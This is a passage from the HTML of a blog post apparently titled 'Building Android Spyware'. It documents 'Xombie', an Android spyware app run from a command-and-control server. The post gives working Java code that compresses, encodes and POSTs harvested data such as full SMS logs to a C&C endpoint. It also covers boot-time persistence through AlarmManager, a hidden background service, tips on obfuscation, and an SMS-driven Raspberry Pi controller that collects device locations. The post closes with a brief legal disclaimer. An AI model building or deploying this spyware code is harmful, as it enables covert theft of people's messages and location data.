    <span class="nt">&lt;string</span> <span class="na">name=</span><span class="s">"app_name"</span><span class="nt">&gt;</span>Xombie<span class="nt">&lt;/string&gt;</span>
    <span class="nt">&lt;string</span> <span class="na">name=</span><span class="s">"cc"</span><span class="nt">&gt;</span>http://192.168.0.14/cc.php<span class="nt">&lt;/string&gt;</span>
    <span class="nt">&lt;string</span> <span class="na">name=</span><span class="s">"milliseconds"</span><span class="nt">&gt;</span>60000<span class="nt">&lt;/string&gt;</span>
<span class="nt">&lt;/resources&gt;</span></code></pre></figure>

<h3 id="231-intercommunication">2.3.1. Intercommunication</h3>
<p>Initially, a device GUID is generated to uniquely identify a “zombie”. This ID is later used as a query parameter in its regular GET requests to the PHP end-point which returns JSON encoded data, hence, we will use the <code class="language-plaintext highlighter-rouge">JsonObject()</code> along <code class="language-plaintext highlighter-rouge">HttpURLConnection</code> to interact with the API. The response is handled by the <code class="language-plaintext highlighter-rouge">onPostExecute()</code> function if the connection was successful and there is a network connectivity as per the <code class="language-plaintext highlighter-rouge">isConnected()</code> boolean method.</p>

<p>To send the payloads, I used the <a href="https://developer.android.com/training/volley" target="_blank">Volley HTTP library</a> which makes networking in Android apps easier. After an array list is returned from methods denoted in the capabilities section, the app will gzip compress payload data, as well as base64 and URL encode it to avoid making parsing a hassle:</p>

<figure class="highlight"><pre><code class="language-java" data-lang="java"><span class="kd">public</span> <span class="kt">void</span> <span class="nf">sendData</span><span class="o">(</span><span class="nc">String</span> <span class="n">task</span><span class="o">,</span> <span class="nc">String</span> <span class="n">uuid</span><span class="o">,</span> <span class="nc">ArrayList</span> <span class="n">requestBody</span><span class="o">)</span> <span class="o">{</span>
    <span class="k">try</span> <span class="o">{</span>
        <span class="nc">RequestQueue</span> <span class="n">requestQueue</span> <span class="o">=</span> <span class="nc">Volley</span><span class="o">.</span><span class="na">newRequestQueue</span><span class="o">(</span><span class="n">getApplicationContext</span><span class="o">());</span>
        <span class="nc">String</span> <span class="no">URL</span> <span class="o">=</span> <span class="n">getString</span><span class="o">(</span><span class="no">R</span><span class="o">.</span><span class="na">string</span><span class="o">.</span><span class="na">cc_php</span><span class="o">);</span>
        <span class="nc">String</span> <span class="n">initial</span> <span class="o">=</span> <span class="nc">String</span><span class="o">.</span><span class="na">valueOf</span><span class="o">(</span><span class="n">requestBody</span><span class="o">);</span>
        <span class="kd">final</span> <span class="kt">byte</span><span class="o">[]</span> <span class="n">gzip</span> <span class="o">=</span> <span class="n">compress</span><span class="o">(</span><span class="n">initial</span><span class="o">);</span>
        <span class="kd">final</span> <span class="nc">String</span> <span class="n">base64</span> <span class="o">=</span> <span class="nc">Base64</span><span class="o">.</span><span class="na">encodeToString</span><span class="o">(</span><span class="n">gzip</span><span class="o">,</span> <span class="nc">Base64</span><span class="o">.</span><span class="na">DEFAULT</span><span class="o">);</span>
        <span class="kd">final</span> <span class="nc">String</span> <span class="n">data</span> <span class="o">=</span> <span class="s">"task= "</span> <span class="o">+</span> <span class="n">task</span> <span class="o">+</span> <span class="s">"&amp;uuid="</span> <span class="o">+</span> <span class="n">uuid</span> <span class="o">+</span> <span class="s">"&amp;data="</span> <span class="o">+</span> <span class="n">base64</span><span class="o">;</span>

        <span class="nc">StringRequest</span> <span class="n">stringRequest</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">StringRequest</span><span class="o">(</span><span class="nc">Request</span><span class="o">.</span><span class="na">Method</span><span class="o">.</span><span class="na">POST</span><span class="o">,</span> <span class="no">URL</span><span class="o">,</span> <span class="k">new</span> <span class="nc">Response</span><span class="o">.</span><span class="na">Listener</span><span class="o">&lt;</span><span class="nc">String</span><span class="o">&gt;()</span> <span class="o">{</span>
            <span class="nd">@Override</span>
            <span class="kd">public</span> <span class="kt">void</span> <span class="nf">onResponse</span><span class="o">(</span><span class="nc">String</span> <span class="n">response</span><span class="o">)</span> <span class="o">{</span>
                <span class="nc">Log</span><span class="o">.</span><span class="na">i</span><span class="o">(</span><span class="s">"VOLLEY"</span><span class="o">,</span> <span class="n">response</span><span class="o">);</span>
            <span class="o">}</span>
        <span class="o">},</span> <span class="k">new</span> <span class="nc">Response</span><span class="o">.</span><span class="na">ErrorListener</span><span class="o">()</span> <span class="o">{</span>
            <span class="nd">@Override</span>
            <span class="kd">public</span> <span class="kt">void</span> <span class="nf">onErrorResponse</span><span class="o">(</span><span class="nc">VolleyError</span> <span class="n">error</span><span class="o">)</span> <span class="o">{</span>
                <span class="nc">Log</span><span class="o">.</span><span class="na">e</span><span class="o">(</span><span class="s">"VOLLEY"</span><span class="o">,</span> <span class="n">error</span><span class="o">.</span><span class="na">toString</span><span class="o">());</span>
            <span class="o">}</span>
        <span class="o">})</span> <span class="o">{</span>
            <span class="nd">@Override</span>
            <span class="kd">public</span> <span class="nc">String</span> <span class="nf">getBodyContentType</span><span class="o">()</span> <span class="o">{</span>
                <span class="k">return</span> <span class="s">"application/x-www-form-urlencoded; charset=utf-8"</span><span class="o">;</span>
            <span class="o">}</span>

            <span class="nd">@Override</span>
            <span class="kd">public</span> <span class="kt">byte</span><span class="o">[]</span> <span class="nf">getBody</span><span class="o">()</span> <span class="o">{</span>
                <span class="k">try</span> <span class="o">{</span>
                    <span class="k">return</span> <span class="n">data</span><span class="o">.</span><span class="na">getBytes</span><span class="o">();</span>
                <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">Exception</span> <span class="n">uee</span><span class="o">)</span> <span class="o">{</span>
                    <span class="nc">VolleyLog</span><span class="o">.</span><span class="na">wtf</span><span class="o">(</span><span class="s">"Unsupported Encoding while trying to get the bytes of %s using %s"</span><span class="o">,</span> <span class="n">data</span><span class="o">,</span> <span class="s">"utf-8"</span><span class="o">);</span>
                    <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
                <span class="o">}</span>
            <span class="o">}</span>

            <span class="nd">@Override</span>
            <span class="kd">protected</span> <span class="nc">Response</span><span class="o">&lt;</span><span class="nc">String</span><span class="o">&gt;</span> <span class="nf">parseNetworkResponse</span><span class="o">(</span><span class="nc">NetworkResponse</span> <span class="n">response</span><span class="o">)</span> <span class="o">{</span>
                <span class="nc">String</span> <span class="n">responseString</span> <span class="o">=</span> <span class="s">""</span><span class="o">;</span>
                <span class="k">if</span> <span class="o">(</span><span class="n">response</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
                    <span class="n">responseString</span> <span class="o">=</span> <span class="nc">String</span><span class="o">.</span><span class="na">valueOf</span><span class="o">(</span><span class="n">response</span><span class="o">.</span><span class="na">statusCode</span><span class="o">);</span>
                    <span class="c1">// can get more details such as response.headers</span>
                <span class="o">}</span>
                <span class="k">return</span> <span class="nc">Response</span><span class="o">.</span><span class="na">success</span><span class="o">(</span><span class="n">responseString</span><span class="o">,</span> <span class="nc">HttpHeaderParser</span><span class="o">.</span><span class="na">parseCacheHeaders</span><span class="o">(</span><span class="n">response</span><span class="o">));</span>
            <span class="o">}</span>
        <span class="o">};</span>
        <span class="n">requestQueue</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="n">stringRequest</span><span class="o">);</span>
    <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
        <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
    <span class="o">}</span>
<span class="o">}</span></code></pre></figure>

<h3 id="232-proof-of-concept">2.3.2. Proof of Concept</h3>
<p>To test the app’s functionality without having to restart the phone, I have added a button on the <code class="language-plaintext highlighter-rouge">MainActivity</code> which invokes the <code class="language-plaintext highlighter-rouge">Fetcher</code> service, or in other words, makes a simple HTTP request as shown below:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET /cc.php?id=6f02ea91-746a-43b2-a646-f50338cd6b2a HTTP/1.1
User-Agent: Dalvik/2.1.0 (Linux; U; Android 9; SM-G960F Build/PPR1.180610.011)
Host: 192.168.0.14
Connection: Keep-Alive
Accept-Encoding: gzip
</code></pre></div></div>
<p>The server responds as follows:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/1.1 200 OK
Date: Thu, 14 Nov 2019 00:15:31 GMT
Server: Apache/2.4.35 (Win32) OpenSSL/1.1.0i PHP/7.2.11
ETag: "48-59740498aca14"
Accept-Ranges: bytes
Content-Length: 72
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: application/json

{
	"uuid":"6f02ea91-746a-43b2-a646-f50338cd6b2a",
	"task":"smsDump"
}
</code></pre></div></div>

<p>Upon receiving the <code class="language-plaintext highlighter-rouge">smsDump</code> command, <code class="language-plaintext highlighter-rouge">Fetcher</code> validates the <code class="language-plaintext highlighter-rouge">SMS_READ</code> permission and uses <code class="language-plaintext highlighter-rouge">sendData()</code> to trasmit the complete SMS logs to the PHP script as seen partially in below:</p>

<p><img src="/assets/images/xombie1.PNG"></p>

<p>I will use <a href="https://gchq.github.io/CyberChef/" target="_blank">GCHQ’s CyberChef</a> to decode data:</p>

<p><img src="/assets/images/xombie2.PNG"></p>

<h1 id="3-application-architecture">3. Application Architecture</h1>
<h2 id="31-background-service">3.1. Background Service</h2>
<p>When it comes to spyware software, you typically want to build application components which perform long-running operations in background without a GUI at all. From an Android perspective, this is possible with services instead of activities:</p>

<figure class="highlight"><pre><code class="language-xml" data-lang="xml"><span class="nt">&lt;service</span>
    <span class="na">android:name=</span><span class="s">"Fetcher"</span>
    <span class="na">android:enabled=</span><span class="s">"true"</span>
    <span class="na">android:label=</span><span class="s">"FetcherService"</span>
    <span class="na">android:process=</span><span class="s">":System"</span><span class="nt">&gt;</span>
<span class="nt">&lt;/service&gt;</span></code></pre></figure>

<p>This service is started from a system standpoint when another module invokes it by calling <code class="language-plaintext highlighter-rouge">startService()</code>. Once started, a service can run in the background indefinitely, even if the component that started it is destroyed. Usually, a started service performs a single operation and does not return a result to the caller. In our specific case, <code class="language-plaintext highlighter-rouge">Fetcher</code> is bound to a loop of operations until its <code class="language-plaintext highlighter-rouge">AlarmManager</code> is terminated.</p>

<h2 id="32-persistence">3.2. Persistence</h2>
<p>When the application gets installed and opened, it will register a receiver which will be invoked during Android boot time <code class="language-plaintext highlighter-rouge">RECEIVE_BOOT_COMPLETED</code> (after system services get fully loaded that is). The main function of this <code class="language-plaintext highlighter-rouge">BroadcastReceiver</code> is to schedule an <code class="language-plaintext highlighter-rouge">AlarmManager</code> to start the Fetcher service periodically, thus, making it persistent in the device:</p>

<figure class="highlight"><pre><code class="language-java" data-lang="java"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">Autostart</span> <span class="kd">extends</span> <span class="nc">BroadcastReceiver</span>
<span class="o">{</span>
    <span class="kd">public</span> <span class="nf">Autostart</span><span class="o">(){</span>
        <span class="c1">// To prevent java.lang.InstantiationException</span>
    <span class="o">}</span>

    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">onReceive</span><span class="o">(</span><span class="nc">Context</span> <span class="n">context</span><span class="o">,</span> <span class="nc">Intent</span> <span class="n">arg1</span><span class="o">)</span>
    <span class="o">{</span>
        <span class="nc">Intent</span> <span class="n">invokeService</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Intent</span><span class="o">(</span><span class="n">context</span><span class="o">,</span> <span class="nc">Fetcher</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
        <span class="nc">PendingIntent</span> <span class="n">pintent</span> <span class="o">=</span> <span class="nc">PendingIntent</span><span class="o">.</span><span class="na">getService</span><span class="o">(</span><span class="n">context</span><span class="o">,</span> <span class="mi">0</span><span class="o">,</span> <span class="n">invokeService</span><span class="o">,</span> <span class="mi">0</span><span class="o">);</span>
        <span class="nc">AlarmManager</span> <span class="n">alarm</span> <span class="o">=</span> <span class="o">(</span><span class="nc">AlarmManager</span><span class="o">)</span> <span class="n">context</span><span class="o">.</span><span class="na">getSystemService</span><span class="o">(</span><span class="nc">Context</span><span class="o">.</span><span class="na">ALARM_SERVICE</span><span class="o">);</span>
        <span class="k">if</span><span class="o">(</span><span class="n">alarm</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">){</span>
            <span class="n">alarm</span><span class="o">.</span><span class="na">setRepeating</span><span class="o">(</span><span class="nc">AlarmManager</span><span class="o">.</span><span class="na">RTC_WAKEUP</span><span class="o">,</span> <span class="nc">System</span><span class="o">.</span><span class="na">currentTimeMillis</span><span class="o">(),</span> <span class="no">R</span><span class="o">.</span><span class="na">string</span><span class="o">.</span><span class="na">milliseconds</span><span class="o">,</span> <span class="n">pintent</span><span class="o">);</span>
        <span class="o">}</span>
    <span class="o">}</span>
<span class="o">}</span></code></pre></figure>

<p><code class="language-plaintext highlighter-rouge">R.string.milliseconds</code> is referenced from <code class="language-plaintext highlighter-rouge">res/values/strings.xml</code> which defines the frequency of device requests from a time standpoint. As of Android 5.1, the minimum value is 60 seconds (60000 milliseconds). Consequently, a “zombie” will send a check-up HTTP request every minute until it receives a task/command.</p>

<p>However, please note that since Android 8 Oreo (API level 26) and above, there is a limitiation with respect to running background services due to malware apps abusing this function; the <code class="language-plaintext highlighter-rouge">startService()</code> method now throws an <code class="language-plaintext highlighter-rouge">IllegalStateException</code>. Apps are permitted to start background processes only under <a href="https://developer.android.com/about/versions/oreo/background.html" target="_blank">specific circumstances</a> when placed on temporary whitelists for handling tasks visible to the user, such as receiving a broadcast (SMS/MMS meesages).</p>

<h2 id="33-obfuscation">3.3. Obfuscation</h2>
<p>If you use Android Studio 3.4 or Android Gradle plugin 3.4.0 and higher, then R8 is the default compiler that converts your project’s Java bytecode into the DEX format that runs on the Android platform. However, when you create a new project using Android Studio, obfuscation is not enabled by default due to the increased build time during code compilation. To enable shortening the name of classes and members (results in reduced DEX file sizes), the following should be added to the <code class="language-plaintext highlighter-rouge">build.gradle</code> file:</p>

<figure class="highlight"><pre><code class="language-gradle" data-lang="gradle"><span class="n">buildTypes</span> <span class="o">{</span>
    <span class="n">release</span> <span class="o">{</span>
        <span class="n">minifyEnabled</span> <span class="kc">true</span>
        <span class="n">shrinkResources</span> <span class="kc">true</span>
    <span class="o">}</span>
<span class="o">}</span></code></pre></figure>

<h1 id="4-project-architecture">4. Project Architecture</h1>
<p>The application itself is a part of a larger system - the Xombie Platform - that we are going to elaborate next. The idea is simple, using a simple SMS message over the GSM network, we are able to control multiple devices that run the APK through the C&amp;C server. The implementation however, is complex due to the following process:</p>

<ol>
  <li>Implementation of a Rasberry Pi device with a GSM shield attached to fetch SMS messages from a controller mobile phone over the GSM network;</li>
  <li>Build of an interconnection mechanism between the API and physical device;</li>
  <li>The ability to distinguishably process incoming traffic from the other mobile devices and respond with the appropiate content of that device.</li>
</ol>

<p>For the larger picture, the above procedure is illustrated in the following scheme:</p>

<p><img src="/assets/images/xombie3.svg" alt="Figure 1 - Xombie Platform Abstract Architecture">
<br></p>

<p>A typical use case would consist of the following process as shown below:</p>

<p><img src="/assets/images/xombie4.svg" alt="Figure 2 - Xombie Platform Use Case"></p>

<p><br>
The controller device sends a command through an SMS message to retrieve all of the mobile phones geographical location (<code class="language-plaintext highlighter-rouge">getGeoLocation</code> keyword). The <a href="https://www.amazon.com/Walmeck-SIM900-Development-Raspberry-Android/dp/B07KS7ZNYD" target="_blank">GSM shield</a>, which can operate in Quad 850/900/1800/1900 MHz frequency bands, uses a local SIM card to receive the message, forward the SMS content to the <code class="language-plaintext highlighter-rouge">smsXlib</code> library, which then queues the task to the hosting server. Considering the mobile devices sends HTTP requests periodically to check whether there is something to do, in this case, they would immediately send relevant latitude and longitude values as a POST request (given that the user has given the application location service permission).</p>

<h1 id="5-disclaimer">5. Disclaimer</h1>
<p><i><b>Disclaimer:</b> Usage of this application for attacking targets without prior mutual consent is illegal. It is the end user’s responsibility to obey all applicable local, state and federal laws. I assume no liability and I am not responsible for any misuse or damage caused.</i></p>

<p><i><a href="../">Go back to homepage</a></i></p>

      </section>
      <hr>
      <div id="share">
         

<style>
#share-buttons {display: inline-block; vertical-align: middle; }
#share-buttons:after {content: ""; display: block; clear: both;}
#share-buttons > div {
    position: relative;
    text-align: left; 
    height: 36px; 
    width: 32px; 
    float: left; 
    text-align: center;
}
#share-buttons > div > svg {height: 16px; fill: #d5d5d5; margin-top: 10px;}
#share-buttons > div:hover {cursor: pointer;}
#share-buttons > div.facebook:hover > svg {fill: #3B5998;}
#share-buttons > div.twitter:hover > svg {fill: #55ACEE;}
#share-buttons > div.linkedin:hover > svg {fill: #0077b5;}
#share-buttons > div.pinterest:hover > svg {fill: #CB2027;}
#share-buttons > div.gplus:hover > svg {fill: #dd4b39;}
#share-buttons > div.mail:hover > svg {fill: #7D7D7D;}
#share-buttons > div.instagram:hover > svg {fill: #C73B92;}
#share-buttons > div.facebook > svg {height: 18px; margin-top: 9px;}
#share-buttons > div.twitter > svg {height: 20px; margin-top: 8px;}
#share-buttons > div.linkedin > svg {height: 19px; margin-top: 7px;}
#share-buttons > div.pinterest > svg {height: 20px; margin-top: 9px;}
#share-buttons > div.gplus > svg {height: 17px; margin-top: 9px; position: relative; left: 1px;}
#share-buttons > div.mail > svg {height: 14px; margin-top: 11px;}
</style>

<span id="csp-gen-e614fce5a3beb62e12c1a1edde3407b8">Share this on: </span><div id="share-buttons">
    <div class="facebook" title="Share this on Facebook" onclick="window.open('https://facebook.com/sharer/sharer.php?u=https://artikrh.github.io/posts/building-android-spyware.html');"><svg viewbox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path d="M1343 12v264h-157q-86 0-116 36t-30 108v189h293l-39 296h-254v759h-306v-759h-255v-296h255v-218q0-186 104-288.5t277-102.5q147 0 228 12z"></path></svg></div>
    <div class="twitter" title="Share this on Twitter" onclick="window.open('https://twitter.com/intent/tweet/?text=Building Android Spyware by @artikrh&amp;url=https://artikrh.github.io/posts/building-android-spyware.html');"><svg viewbox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path d="M1684 408q-67 98-162 167 1 14 1 42 0 130-38 259.5t-115.5 248.5-184.5 210.5-258 146-323 54.5q-271 0-496-145 35 4 78 4 225 0 401-138-105-2-188-64.5t-114-159.5q33 5 61 5 43 0 85-11-112-23-185.5-111.5t-73.5-205.5v-4q68 38 146 41-66-44-105-115t-39-154q0-88 44-163 121 149 294.5 238.5t371.5 99.5q-8-38-8-74 0-134 94.5-228.5t228.5-94.5q140 0 236 102 109-21 205-78-37 115-142 178 93-10 186-50z"></path></svg></div>
    <div class="linkedin" title="Share this on Linkedin" onclick="window.open('https://www.linkedin.com/shareArticle?mini=true&amp;url=https://artikrh.github.io/posts/building-android-spyware.html&amp;title=Arti Karahoda&amp;summary=Arti Karahoda&amp;source=GitHub');"><svg viewbox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path d="M477 625v991h-330v-991h330zm21-306q1 73-50.5 122t-135.5 49h-2q-82 0-132-49t-50-122q0-74 51.5-122.5t134.5-48.5 133 48.5 51 122.5zm1166 729v568h-329v-530q0-105-40.5-164.5t-126.5-59.5q-63 0-105.5 34.5t-63.5 85.5q-11 30-11 81v553h-329q2-399 2-647t-1-296l-1-48h329v144h-2q20-32 41-56t56.5-52 87-43.5 114.5-15.5q171 0 275 113.5t104 332.5z"></path></svg></div>
    <div class="mail" title="Share this through Email" onclick="window.open('mailto:?&amp;body=https://artikrh.github.io/posts/building-android-spyware.html');"><svg viewbox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path d="M1792 710v794q0 66-47 113t-113 47h-1472q-66 0-113-47t-47-113v-794q44 49 101 87 362 246 497 345 57 42 92.5 65.5t94.5 48 110 24.5h2q51 0 110-24.5t94.5-48 92.5-65.5q170-123 498-345 57-39 100-87zm0-294q0 79-49 151t-122 123q-376 261-468 325-10 7-42.5 30.5t-54 38-52 32.5-57.5 27-50 9h-2q-23 0-50-9t-57.5-27-52-32.5-54-38-42.5-30.5q-91-64-262-182.5t-205-142.5q-62-42-117-115.5t-55-136.5q0-78 41.5-130t118.5-52h1472q65 0 112.5 47t47.5 113z"></path></svg></div>
</div>
      </div>
   </div>
   
   <script>
      (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
      (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
      m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
      })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
      ga('create', 'UA-151966598-1', 'auto');
      ga('send', 'pageview');
   </script>
   

</body>
</html>
